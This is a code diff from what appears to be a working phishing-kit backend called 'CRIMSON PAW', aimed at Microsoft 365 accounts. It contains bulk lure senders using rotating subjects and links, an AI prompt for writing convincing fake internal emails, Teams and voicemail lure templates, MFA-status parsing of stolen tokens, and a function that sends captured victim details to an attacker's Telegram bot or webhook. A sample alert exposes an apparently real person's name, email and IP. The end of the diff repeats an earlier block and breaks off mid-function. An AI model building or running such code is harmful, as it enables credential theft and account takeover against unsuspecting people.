+                    'body': {'contentType': 'HTML', 'content': body_final},
+                    'toRecipients': to_rec,
+                    'importance': priority
+                }
+                if attachments:
+                    msg_obj['attachments'] = attachments
+
+                try:
+                    res = graph.make_graph_request(
+                        '/me/sendMail', token,
+                        method='POST',
+                        payload={'message': msg_obj, 'saveToSentItems': save_sent}
+                    )
+                    if res is None or not res.get('error'):
+                        sent += 1
+                        yield sse({'type': 'sent', 'recipient': rec, 'subject': subj_final})
+                    else:
+                        failed += 1
+                        err_msg = res.get('error', {}).get('message', 'Send failed')
+                        yield sse({'type': 'failed', 'recipient': rec, 'error': err_msg})
+                except Exception as ex:
+                    failed += 1
+                    yield sse({'type': 'failed', 'recipient': rec, 'error': str(ex)})
+
+                if delay_ms > 0:
+                    time.sleep(delay_ms / 1000.0)
+
+        yield sse({'type': 'done', 'sent': sent, 'failed': failed})
+
+    return Response(stream_with_context(generate()), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@app.route('/api/b2b/campaigns', methods=['GET'])
+def b2b_list_campaigns():
+    import sqlite3
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    rows = [dict(r) for r in conn.execute('SELECT * FROM b2b_campaigns ORDER BY created_at DESC').fetchall()]
+    conn.close()
+    return jsonify(rows)
+
+
+@app.route('/api/b2b/campaigns', methods=['POST'])
+def b2b_save_campaign():
+    import sqlite3
+    d = request.json or {}
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.execute('''INSERT INTO b2b_campaigns
+        (name,subject_lines,link_lines,body_html,recipients,sender_user_code,
+         priority,delay_ms,subject_rotate_n,link_rotate_n,bcc_mode,save_sent)
+        VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
+        (d.get('name'), d.get('subject_lines'), d.get('link_lines'),
+         d.get('body_html'), d.get('recipients'), d.get('sender_user_code'),
+         d.get('priority','normal'), int(d.get('delay_ms',0)),
+         int(d.get('subject_rotate_n',1)), int(d.get('link_rotate_n',1)),
+         int(d.get('bcc_mode',0)), int(d.get('save_sent',1))))
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True})
+
+
+@app.route('/api/b2b/campaigns/<int:cid>', methods=['GET'])
+def b2b_get_campaign(cid):
+    import sqlite3
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    row = conn.execute('SELECT * FROM b2b_campaigns WHERE id=?', (cid,)).fetchone()
+    conn.close()
+    return jsonify(dict(row)) if row else (jsonify({'error': 'Not found'}), 404)
+
+
+@app.route('/api/b2b/campaigns/<int:cid>', methods=['DELETE'])
+def b2b_delete_campaign(cid):
+    import sqlite3
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.execute('DELETE FROM b2b_campaigns WHERE id=?', (cid,))
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True})
+
+
+@app.route('/api/b2b/ai_check', methods=['GET'])
+def b2b_ai_check():
+    """Quick check: is the Gemini API key configured?"""
+    return jsonify({'ready': bool(Config.GEMINI_API_KEY)})
+
+
+@app.route('/api/b2b/ai_write', methods=['POST'])
+def b2b_ai_write():
+    """Stream AI-generated email HTML via Google Gemini (google-genai SDK)."""
+    import json as _json
+
+    if not Config.GEMINI_API_KEY:
+        def _no_key():
+            yield 'data: {"error": "GEMINI_API_KEY not set in .env"}\n\n'
+        return Response(stream_with_context(_no_key()), mimetype='text/event-stream')
+
+    data        = request.json or {}
+    instruction = data.get('instruction', '').strip()
+    tone        = data.get('tone', 'professional')
+    length      = data.get('length', 'medium')
+    sender      = data.get('sender', 'IT Support')
+    fmt         = data.get('format', 'html')
+    campaign    = data.get('campaign_name', '')
+
+    length_map  = {'short': '2-3 short paragraphs', 'medium': '3-5 paragraphs', 'long': '5 or more paragraphs'}
+    length_desc = length_map.get(length, '3-5 paragraphs')
+
+    if fmt == 'html':
+        fmt_instruction = (
+            'Return full HTML email body only (no <html>/<head>/<body> wrapper). '
+            'Use inline CSS for styling. Use a professional Microsoft-style layout with '
+            'a branded header div, paragraph text, and a clearly styled CTA button. '
+            'Do NOT include markdown code fences or any text outside the HTML.'
+        )
+    elif fmt == 'plain_html':
+        fmt_instruction = (
+            'Return simple HTML using only <p>, <b>, <a>, <br> tags. '
+            'Do NOT include markdown code fences or any text outside the HTML.'
+        )
+    else:
+        fmt_instruction = 'Return plain text only. No HTML tags. No markdown.'
+
+    system_prompt = f"""You are an expert corporate email copywriter.
+You write convincing, professional internal business emails.
+
+Rules:
+- Sender/department: {sender if sender != 'custom' else 'as described in the instruction'}
+- Tone: {tone}
+- Length: {length_desc}
+- {fmt_instruction}
+- Use merge tags where appropriate: [NAME] for recipient name, [COMPANY] for company, [LINK] for action links, [EMAIL] for email address
+- The email should feel completely legitimate and internally familiar
+- Do NOT add any commentary, explanations, or meta-text — output ONLY the email content
+{'- Campaign context: ' + campaign if campaign else ''}"""
+
+    def generate():
+        try:
+            from google import genai
+            from google.genai import types
+
+            client = genai.Client(api_key=Config.GEMINI_API_KEY)
+
+            stream = client.models.generate_content_stream(
+                model='gemini-2.0-flash',
+                contents=instruction,
+                config=types.GenerateContentConfig(
+                    system_instruction=system_prompt,
+                    temperature=0.85,
+                    max_output_tokens=2048
+                )
+            )
+
+            for chunk in stream:
+                text = chunk.text if chunk.text else ''
+                if text:
+                    yield f'data: {_json.dumps({"chunk": text})}\n\n'
+
+            yield f'data: {_json.dumps({"done": True})}\n\n'
+
+        except Exception as ex:
+            logger.error(f'[AI Writer] Error: {ex}')
+            yield f'data: {_json.dumps({"error": str(ex)})}\n\n'
+
+    return Response(stream_with_context(generate()), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@app.route('/api/b2b/smtp_test', methods=['POST'])
+def b2b_smtp_test():
+    """Test SMTP connection credentials."""
+    import smtplib, ssl as _ssl
+    d        = request.json or {}
+    host     = d.get('host', '').strip()
+    port     = int(d.get('port', 587))
+    security = d.get('security', 'tls')
+    user     = d.get('user', '').strip()
+    password = d.get('password', '')
+    if not host:
+        return jsonify({'success': False, 'error': 'SMTP host is required'})
+    try:
+        ctx = _ssl.create_default_context()
+        if security == 'ssl':
+            with smtplib.SMTP_SSL(host, port, context=ctx, timeout=10) as s:
+                if user: s.login(user, password)
+        else:
+            with smtplib.SMTP(host, port, timeout=10) as s:
+                if security == 'tls': s.starttls(context=ctx)
+                if user: s.login(user, password)
+        return jsonify({'success': True})
+    except Exception as ex:
+        return jsonify({'success': False, 'error': str(ex)})
+
+
+@app.route('/api/b2b/send_smtp', methods=['POST'])
+def b2b_send_smtp():
+    """Stream email sends via user-configured SMTP server."""
+    import smtplib, ssl as _ssl, time as _time, json as _json
+    from email.mime.multipart import MIMEMultipart
+    from email.mime.text import MIMEText
+
+    data      = request.json or {}
+    recipients  = data.get('recipients', [])
+    subjects    = data.get('subjects', []) or ['(No Subject)']
+    links       = data.get('links', [])
+    body_html   = data.get('body_html', '')
+    subj_rot    = max(1, int(data.get('subject_rotate_n', 1)))
+    link_rot    = max(1, int(data.get('link_rotate_n', 1)))
+    delay_ms    = max(0, int(data.get('delay_ms', 0)))
+    priority    = data.get('priority', 'normal').lower()
+
+    # SMTP config comes from the client payload (stored in browser localStorage)
+    smtp_cfg    = data.get('smtp', {})
+    host        = smtp_cfg.get('host', '').strip()
+    port        = int(smtp_cfg.get('port', 587))
+    security    = smtp_cfg.get('security', 'tls')
+    from_addr   = smtp_cfg.get('from_addr', '').strip()
+    from_name   = smtp_cfg.get('from_name', '').strip()
+    user        = smtp_cfg.get('user', '').strip()
+    password    = smtp_cfg.get('pass_enc', '')
+
+    def _err(msg):
+        yield f'data: {_json.dumps({"type":"status","msg":msg,"cls":"error"})}\n\n'
+        yield f'data: {_json.dumps({"type":"done","sent":0,"failed":0})}\n\n'
+
+    if not host or not from_addr:
+        return Response(stream_with_context(_err('SMTP host and From address are required — open ⚙ SMTP Settings')),
+                        mimetype='text/event-stream')
+
+    sender_str = f'"{from_name}" <{from_addr}>' if from_name else from_addr
+
+    def generate():
+        sent = failed = 0
+        ctx = _ssl.create_default_context()
+
+        try:
+            if security == 'ssl':
+                smtp_conn = smtplib.SMTP_SSL(host, port, context=ctx, timeout=20)
+            else:
+                smtp_conn = smtplib.SMTP(host, port, timeout=20)
+                if security == 'tls':
+                    smtp_conn.starttls(context=ctx)
+            if user:
+                smtp_conn.login(user, password)
+        except Exception as ex:
+            yield f'data: {_json.dumps({"type":"status","msg":f"SMTP connect failed: {ex}","cls":"error"})}\n\n'
+            yield f'data: {_json.dumps({"type":"done","sent":0,"failed":0})}\n\n'
+            return
+
+        def sse(obj):
+            return f'data: {_json.dumps(obj)}\n\n'
+
+        with smtp_conn:
+            for i, rec in enumerate(recipients):
+                rec = rec.strip().lower()
+                if not rec or '@' not in rec:
+                    continue
+
+                subj = subjects[(i // subj_rot) % len(subjects)].strip()
+                link = (links[(i // link_rot) % len(links)].strip() if links else '')
+
+                name    = rec.split('@')[0]
+                domain  = rec.split('@')[1]
+                company = domain.split('.')[0].title()
+                first_name = name.split('.')[0].title()
+                date_str = datetime.datetime.now().strftime('%B %d, %Y')
+
+                def merge(text):
+                    return (text
+                        .replace('[NAME]', name.replace('.', ' ').title())
+                        .replace('{NAME}', name.replace('.', ' ').title())
+                        .replace('{name}', name.replace('.', ' ').title())
+                        .replace('[FIRST_NAME]', first_name)
+                        .replace('{FIRST_NAME}', first_name)
+                        .replace('{first_name}', first_name)
+                        .replace('[EMAIL]', rec)
+                        .replace('{EMAIL}', rec)
+                        .replace('{email}', rec)
+                        .replace('[DOMAIN]', domain)
+                        .replace('{DOMAIN}', domain)
+                        .replace('{domain}', domain)
+                        .replace('[COMPANY]', company)
+                        .replace('{COMPANY}', company)
+                        .replace('{company}', company)
+                        .replace('[LINK]', link)
+                        .replace('{LINK}', link)
+                        .replace('{link}', link)
+                        .replace('[URL]', link)
+                        .replace('{URL}', link)
+                        .replace('{url}', link)
+                        .replace('[DATE]', date_str)
+                        .replace('{DATE}', date_str)
+                        .replace('{date}', date_str))
+
+                subj_final = merge(subj)
+                body_final = merge(body_html)
+
+                msg = MIMEMultipart('alternative')
+                msg['Subject'] = subj_final
+                msg['From']    = sender_str
+                msg['To']      = rec
+                if priority == 'high':
+                    msg['X-Priority'] = '1'
+                    msg['Importance'] = 'high'
+
+                msg.attach(MIMEText(body_final, 'html', 'utf-8'))
+
+                try:
+                    smtp_conn.sendmail(from_addr, [rec], msg.as_string())
+                    sent += 1
+                    yield sse({'type': 'sent', 'recipient': rec, 'subject': subj_final})
+                except Exception as ex:
+                    failed += 1
+                    yield sse({'type': 'failed', 'recipient': rec, 'error': str(ex)})
+
+                if delay_ms > 0:
+                    _time.sleep(delay_ms / 1000)
+
+        yield sse({'type': 'done', 'sent': sent, 'failed': failed})
+
+    return Response(stream_with_context(generate()), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+# ════════════════════════════════════════════════════════════════
+# PLATFORM SETTINGS & MAINTENANCE ROUTES
+# ════════════════════════════════════════════════════════════════
+
+SETTINGS_FILE = Path(__file__).parent / 'settings.json'
+
+@app.route('/api/settings', methods=['GET'])
+def get_platform_settings():
+    defaults = {
+        'platform_name': 'CRIMSON PAW',
+        'default_redirect': 'https://www.office.com/',
+        'deploy_host': Config.DEPLOY_HOST,
+        'refresh_threshold': 10,
+        'nc_user': Config.NAMECHEAP_API_USER or '',
+        'nc_key': Config.NAMECHEAP_API_KEY or '',
+        'nc_ip': Config.NAMECHEAP_CLIENT_IP or '',
+        'nc_env': 'production',
+        'tg_bot_token': '',
+        'tg_chat_id': '',
+        'webhook_url': '',
+        'notify_token': True
+    }
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                saved = json.load(f)
+                defaults.update(saved)
+        except Exception: pass
+    return jsonify(defaults)
+
+@app.route('/api/auth/change_password', methods=['POST'])
+def api_auth_change_password():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden: Admin access required'}), 403
+    data = request.json or {}
+    new_pwd = (data.get('new_password') or '').strip()
+    if not new_pwd:
+        return jsonify({'error': 'New password cannot be empty'}), 400
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+
+    cfg['admin_password'] = new_pwd
+    try:
+        with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, indent=2)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/settings', methods=['POST'])
+def save_platform_settings():
+    data = request.json or {}
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+    cfg.update(data)
+    try:
+        with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, indent=2)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def html_escape(text):
+    if text is None: return ''
+    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+
+def _send_raw_alert(tg_html, wh_md, is_prt=False):
+    """Core alert dispatcher sending rich HTML to Telegram and Markdown to Webhook."""
+    try:
+        cfg = {}
+        if SETTINGS_FILE.exists():
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+
+        if not cfg.get('notify_token', True):
+            return
+
+        # 1. Telegram Dispatch (Rich HTML)
+        bot_token = cfg.get('tg_bot_token', '').strip()
+        chat_id = cfg.get('tg_chat_id', '').strip()
+        if bot_token and chat_id:
+            import urllib.request
+            payload = json.dumps({
+                'chat_id': chat_id,
+                'text': tg_html,
+                'parse_mode': 'HTML',
+                'disable_web_page_preview': True
+            }).encode('utf-8')
+            req = urllib.request.Request(
+                f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                data=payload,
+                headers={'Content-Type': 'application/json'}
+            )
+            urllib.request.urlopen(req, timeout=10)
+
+        # 2. Discord / Slack Webhook Dispatch
+        wh_url = cfg.get('webhook_url', '').strip()
+        if wh_url:
+            import urllib.request
+            payload = json.dumps({
+                'username': 'CRIMSON PAW Alert',
+                'content': wh_md
+            }).encode('utf-8')
+            req = urllib.request.Request(
+                wh_url,
+                data=payload,
+                headers={'Content-Type': 'application/json', 'User-Agent': 'CrimsonPaw/2.0'}
+            )
+            urllib.request.urlopen(req, timeout=10)
+    except Exception as e:
+        logger.error(f"_send_raw_alert error: {e}")
+
+@app.route('/api/settings/test-telegram', methods=['POST'])
+def test_platform_telegram():
+    data = request.json or {}
+    bot_token = data.get('tg_bot_token', '').strip()
+    chat_id = data.get('tg_chat_id', '').strip()
+    if not bot_token or not chat_id:
+        return jsonify({'success': False, 'error': 'Bot Token and Chat ID are both required'}), 400
+    try:
+        import urllib.request
+        now = datetime.datetime.now()
+        day = str(now.day)
+        month = now.strftime("%b")
+        time_str = now.strftime("%I:%M %p").lstrip("0")
+        added_time = f"{day} {month} {time_str}"
+        msg = (
+            "💎Crimson Paw office Result💎\n"
+            "👤Name: Lizbeth Lozoya\n"
+            "📧Email: llozoya@solomon-arieh.com\n"
+            "🎭Role: Member\n"
+            "🌐IP: 38.255.36.137\n"
+            "🌍Country: United States\n"
+            "🖥Browser: Chrome\n"
+            f"🕐Added Time: {added_time}"
+        )
+        payload = json.dumps({
+            'chat_id': chat_id,
+            'text': msg,
+            'disable_web_page_preview': True
+        }).encode('utf-8')
+        tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        req = urllib.request.Request(tg_url, data=payload, headers={'Content-Type': 'application/json'})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            res_data = json.loads(r.read().decode('utf-8'))
+            if res_data.get('ok'):
+                return jsonify({'success': True})
+            return jsonify({'success': False, 'error': res_data.get('description', 'Telegram error')}), 400
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/settings/test-webhook', methods=['POST'])
+def test_platform_webhook():
+    data = request.json or {}
+    url = data.get('webhook_url', '').strip()
+    if not url:
+        return jsonify({'success': False, 'error': 'Webhook URL required'}), 400
+    try:
+        import urllib.request
+        payload = json.dumps({
+            'username': 'CRIMSON PAW Alert',
+            'content': '🧪 **CRIMSON PAW Test Alert**\nWebhook integration verified successfully from your CRIMSON PAW console.'
+        }).encode('utf-8')
+        req = urllib.request.Request(url, data=payload, headers={
+            'Content-Type': 'application/json',
+            'User-Agent': 'CrimsonPaw/2.0'
+        })
+        with urllib.request.urlopen(req, timeout=8) as r:
+            return jsonify({'success': True, 'status': r.status})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def extract_amr_info(access_token, token_metadata=None):
+    """Extract AMR (Authentication Method References) and MFA status from token JWT."""
+    claims = _decode_jwt(access_token) if access_token else {}
+    amr = claims.get('amr') or []
+
+    if not amr and token_metadata:
+        try:
+            if isinstance(token_metadata, str):
+                token_metadata = json.loads(token_metadata)
+            id_token = token_metadata.get('id_token')
+            if id_token:
+                id_claims = _decode_jwt(id_token)
+                amr = id_claims.get('amr') or []
+        except Exception:
+            pass
+
+    if isinstance(amr, str):
+        amr = [amr]
+
+    if not amr:
+        return "Single Factor Only (No MFA)", "Password (pwd)"
+
+    amr_map = {
+        'pwd': 'Password (pwd)',
+        'mfa': 'Multi-Factor Auth (mfa)',
+        'fido': 'FIDO2 / Security Key / Passkey',
+        'sms': 'SMS OTP',
+        'phoneappnotification': 'Microsoft Authenticator Push',
+        'phoneappotp': 'Authenticator Code (TOTP)',
+        'wia': 'Windows Integrated Authentication (wia)',
+        'ngcmfa': 'Windows Hello for Business (ngcmfa)',
+        'face': 'Windows Hello Face',
+        'fingerprint': 'Biometric Fingerprint',
+        'pin': 'Hardware PIN',
+        'possessioncookie': 'PRT Device Cookie'
+    }
+
+    friendly = [amr_map.get(m.lower(), m) for m in amr]
+    has_mfa = any(m.lower() in ('mfa', 'fido', 'ngcmfa', 'phoneappnotification', 'phoneappotp', 'sms') for m in amr)
+
+    methods_str = ", ".join(friendly)
+    if has_mfa or 'mfa' in [m.lower() for m in amr]:
+        status_str = "✅ MFA Satisfied"
+    else:
+        status_str = "⚠️ Single Factor (No MFA)"
+
+    return status_str, methods_str
+
+def _clean_browser_name(ua):
+    if not ua:
+        return 'Chrome'
+    ua_l = ua.lower()
+    if 'edg' in ua_l:
+        return 'Edge'
+    if 'opr' in ua_l or 'opera' in ua_l:
+        return 'Opera'
+    if 'chrome' in ua_l or 'crios' in ua_l:
+        return 'Chrome'
+    if 'firefox' in ua_l or 'fxios' in ua_l:
+        return 'Firefox'
+    if 'safari' in ua_l and 'chrome' not in ua_l:
+        return 'Safari'
+    if 'msie' in ua_l or 'trident' in ua_l:
+        return 'Internet Explorer'
+    if len(ua) <= 20:
+        return ua
+    return 'Chrome'
+
+def dispatch_victim_compromised_alert(user_code):
+    """
+    Single rich Telegram and Webhook alert dispatched strictly ONCE
+    after the entire registration and credential capture pipeline completes.
+    Strictly formatted to the 8-line layout:
+    💎Crimson Paw office Result💎
+    👤Name: Lizbeth Lozoya
+    📧Email: llozoya@solomon-arieh.com
+    🎭Role: Member
+    🌐IP: 38.255.36.137
+    🌍Country: United States
+    🖥Browser: Chrome
+    🕐Added Time: 23 Sep 5:11 PM
+    """
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        conn.row_factory = sqlite3.Row
+        s = conn.execute("""
+            SELECT s.*, t.name as template_name 
+            FROM sessions s 
+            LEFT JOIN templates t ON s.template_id = t.id 
+            WHERE s.user_code = ?
+        """, (user_code,)).fetchone()
+        conn.close()
+
+        if not s:
+            return
+
+        name = s['victim_name'] or 'Unknown'
+        email = s['victim_email'] or 'Unknown'
+        role = s['victim_role'] or 'Member'
+        if role in ('N/A', 'Unknown', ''):
+            role = 'Member'
+
+        # Template / service label
+        tmpl_raw = (s['template_name'] or 'office').strip()
+        tmpl_l = tmpl_raw.lower()
+        if 'office' in tmpl_l or '365' in tmpl_l or 'outlook' in tmpl_l:
+            service_label = 'office'
+        else:
+            service_label = tmpl_raw
+
+        # IP address - prioritize victim connection IP, fallback to real server public egress IP
+        ip = (s['victim_ip'] or '').strip()
+        if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
+            try:
+                import urllib.request
+                with urllib.request.urlopen('https://api.ipify.org', timeout=3) as resp:
+                    ip = resp.read().decode('utf-8').strip()
+            except Exception:
+                ip = s['victim_ip'] or 'Remote Visitor'
+
+        # Geolocation Country via real IP lookup
+        country = 'United States'
+        if ip and not ip.startswith(('127.', '192.168.', '10.', '172.', 'Remote')):
+            try:
+                import requests
+                geo_res = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country', timeout=3)
+                geo_data = geo_res.json()
+                if geo_data.get('status') == 'success' and geo_data.get('country'):
+                    country = geo_data.get('country')
+            except Exception:
+                pass
+
+        # Browser
+        browser = _clean_browser_name(s['victim_browser'])
+
+        # Added Time (e.g. 23 Sep 5:11 PM)
+        now = datetime.datetime.now()
+        day = str(now.day)
+        month = now.strftime("%b")
+        time_str = now.strftime("%I:%M %p").lstrip("0")
+        added_time = f"{day} {month} {time_str}"
+
+        # Exact 8-line layout matching user specification
+        tg_html = (
+            f"💎Crimson Paw {service_label} Result💎\n"
+            f"👤Name: {html_escape(name)}\n"
+            f"📧Email: {html_escape(email)}\n"
+            f"🎭Role: {html_escape(role)}\n"
+            f"🌐IP: {html_escape(ip)}\n"
+            f"🌍Country: {html_escape(country)}\n"
+            f"🖥Browser: {html_escape(browser)}\n"
+            f"🕐Added Time: {html_escape(added_time)}"
+        )
+
+        wh_md = (
+            f"💎**Crimson Paw {service_label} Result**💎\n"
+            f"👤Name: {name}\n"
+            f"📧Email: {email}\n"
+            f"🎭Role: {role}\n"
+            f"🌐IP: {ip}\n"
+            f"🌍Country: {country}\n"
+            f"🖥Browser: {browser}\n"
+            f"🕐Added Time: {added_time}"
+        )
+
+        _send_raw_alert(tg_html, wh_md, is_prt=False)
+    except Exception as e:
+        logger.error(f"dispatch_victim_compromised_alert error: {e}")
+
+def dispatch_alert(title, message, is_prt=False):
+    """Fallback generic rich alert dispatcher."""
+    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    safe_title = html_escape(title)
+    safe_msg = html_escape(message).replace('\n', '<br>')
+    tg_html = (
+        f"🐾 <b>CRIMSON PAW</b> | <b>{safe_title}</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{safe_msg}\n\n"
+        f"🕒 <code>{now_str}</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    wh_md = f"🐾 **CRIMSON PAW | {title}**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{message}\n🕒 `{now_str}`"
+    _send_raw_alert(tg_html, wh_md, is_prt=is_prt)
+
+
+@app.route('/api/backup/export', methods=['GET'])
+def export_database_backup():
+    from flask import send_file
+    if os.path.exists(Config.DB_PATH):
+        return send_file(Config.DB_PATH, as_attachment=True, download_name='crimson_paw_backup.db')
+    return jsonify({'error': 'Database file not found'}), 404
+
+@app.route('/api/sessions/purge-expired', methods=['POST'])
+def purge_expired_sessions():
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        cur = conn.cursor()
+        cur.execute("DELETE FROM sessions WHERE status IN ('EXPIRED', 'TERMINATED')")
+        purged = cur.rowcount
+        conn.commit()
+        conn.close()
+        return jsonify({'success': True, 'purged': purged})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/sessions/purge-inactive', methods=['POST'])
+def purge_inactive_sessions_route():
+    try:
+        deleted = db.purge_inactive_sessions()
+        return jsonify({'success': True, 'deleted': deleted})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+# ── Sandbox Templates Studio Routes ─────────────────────────────────────────
+import sandbox_templates
+
+@app.route('/sandbox/templates', methods=['GET'])
+def sandbox_templates_studio():
+    return render_template_string(sandbox_templates.render_sandbox_studio_page())
+
+@app.route('/sandbox/templates/<template_key>/<stage>', methods=['GET'])
+def sandbox_standalone_page(template_key, stage):
+    cfg_overrides = dict(request.args)
+    html = sandbox_templates.render_sandbox_preview(template_key, stage, cfg_overrides)
+    return render_template_string(html)
+
+@app.route('/sandbox/render', methods=['GET', 'POST'])
+def sandbox_dynamic_render():
+    if request.method == 'POST':
+        data = request.get_json() or {}
+        tmpl = data.get('template', 'meeting')
+        stage = data.get('stage', 'preland')
+        overrides = data.get('config', {})
+    else:
+        tmpl = request.args.get('template', 'meeting')
+        stage = request.args.get('stage', 'preland')
+        overrides = dict(request.args)
+    html = sandbox_templates.render_sandbox_preview(tmpl, stage, overrides)
+    return render_template_string(html)
+
+@app.route('/sandbox/api/info', methods=['GET'])
+def sandbox_templates_info():
+    return jsonify({
+        'templates': [
+            {'key': 'meeting', 'name': 'Teams Meeting', 'category': 'Collaboration & Video', 'accent': '#5B5FC7'},
+            {'key': 'voicemail', 'name': 'Cloud Voicemail', 'category': 'Unified Voice & Audio', 'accent': '#0078D4'}
+        ]
+    })
+
+
+if __name__ == '__main__':
+
+    db.init_db()
+    logger.info(f"Starting CRIMSON PAW on http://{Config.WEB_HOST}:{Config.WEB_PORT}")
+    app.run(host=Config.WEB_HOST, port=Config.WEB_PORT, debug=False)
+        return 'Opera'
+    if 'chrome' in ua_l or 'crios' in ua_l:
+        return 'Chrome'
+    if 'firefox' in ua_l or 'fxios' in ua_l:
+        return 'Firefox'
+    if 'safari' in ua_l and 'chrome' not in ua_l:
+        return 'Safari'
+    if 'msie' in ua_l or 'trident' in ua_l:
+        return 'Internet Explorer'
+    if len(ua) <= 20:
+        return ua
+    return 'Chrome'
+
+def dispatch_victim_compromised_alert(user_code):
+    """
+    Single rich Telegram and Webhook alert dispatched strictly ONCE
+    after the entire registration and credential capture pipeline completes.
+    Strictly formatted to the 8-line layout:
+    💎Crimson Paw office Result💎
+    👤Name: Lizbeth Lozoya
+    📧Email: llozoya@solomon-arieh.com
+    🎭Role: Member
+    🌐IP: 38.255.36.137
+    🌍Country: United States
+    🖥Browser: Chrome
+    🕐Added Time: 23 Sep 5:11 PM
+    """
+    try:
+        conn = sqlite3.connect(Config.DB_PATH)
+        conn.row_factory = sqlite3.Row
+        s = conn.execute("""
+            SELECT s.*, t.name as template_name 
+            FROM sessions s 
+            LEFT JOIN templates t ON s.template_id = t.id 
+            WHERE s.user_code = ?
+        """, (user_code,)).fetchone()
+        conn.close()
+
+        if not s:
+            return
+
+        name = s['victim_name'] or 'Unknown'
+        email = s['victim_email'] or 'Unknown'
+        role = s['victim_role'] or 'Member'
+        if role in ('N/A', 'Unknown', ''):
+            role = 'Member'
+
+        # Template / service label
+        tmpl_raw = (s['template_name'] or 'office').strip()
+        tmpl_l = tmpl_raw.lower()
+        if 'office' in tmpl_l or '365' in tmpl_l or 'outlook' in tmpl_l:
+            service_label = 'office'
+        else:
+            service_label = tmpl_raw
+
+        # IP address - prioritize victim connection IP, fallback to real server public egress IP
+        ip = (s['victim_ip'] or '').strip()
+        if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
+            try:
+                import urllib.request
+                with urllib.request.urlopen('https://api.ipify.org', timeout=3) as resp:
+                    ip = resp.read().decode('utf-8').strip()
+            except Exception:
+                ip = s['victim_ip'] or 'Remote Visitor'
+
+        # Geolocation Country via real IP lookup
+        country = 'United States'
+        if ip and not ip.startswith(('127.', '192.168.', '10.', '172.', 'Remote')):
+            try:
+                import requests
+                geo_res = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country', timeout=3)
+                geo_data = geo_res.json()
+                if geo_data.get('status') == 'success' and geo_data.get('country'):
+                    country = geo_data.get('country')
+            except Exception:
+                pass
+
+        # Browser
+        browser = _clean_browser_name(s['victim_browser'])
+
+        # Added Time (e.g. 23 Sep 5:11 PM)
+        now = datetime.datetime.now()
+        day = str(now.day)
+        month = now.strftime("%b")
+        time_str = now.strftime("%I:%M %p").lstrip("0")
+        added_time = f"{day} {month} {time_str}"
+
+        # Exact 8-line layout matching user specification
+        tg_html = (
+            f"💎Crimson Paw {service_label} Result💎\n"
+            f"👤Name: {html_escape(name)}\n"
+            f"📧Email: {html_escape(email)}\n"
+            f"🎭Role: {html_escape(role)}\n"
+            f"🌐IP: {html_escape(ip)}\n"
+            f"🌍Country: {html_escape(country)}\n"
+            f"🖥Browser: {html_escape(browser)}\n"
+            f"🕐Added Time: {html_escape(added_time)}"
+        )
+
+        wh_md = (
+            f"💎**Crimson Paw {service_label} Result**💎\n"
+            f"👤Name: {name}\n"
+            f"📧Email: {email}\n"
+            f"🎭Role: {role}\n"
+            f"🌐IP: {ip}\n"
+            f"🌍Country: {country}\n"
+            f"🖥Browser: {browser}\n"
+            f"🕐Added Time: {added_time}"
+        )
+
+        _send_raw_alert(tg_html, wh_md, is_prt=False)
+    except Exception as e:
+        logger.error(f"dispatch_victim_compromised_alert error: {e}")
+
+def dispatch_alert(title, message, is_prt=False):
+    """Fallback generic rich alert dispatcher."""
+    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    safe_title = html_escape(title)
+    safe_msg = html_escape(message).replace('\n', '<br>')
+    tg_html = (
+        f"🐾 <b>CRIMSON PAW</b> | <b>{safe_title}</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{safe_msg}\n\n"
+        f"🕒 <code>{now_str}</code>\n"
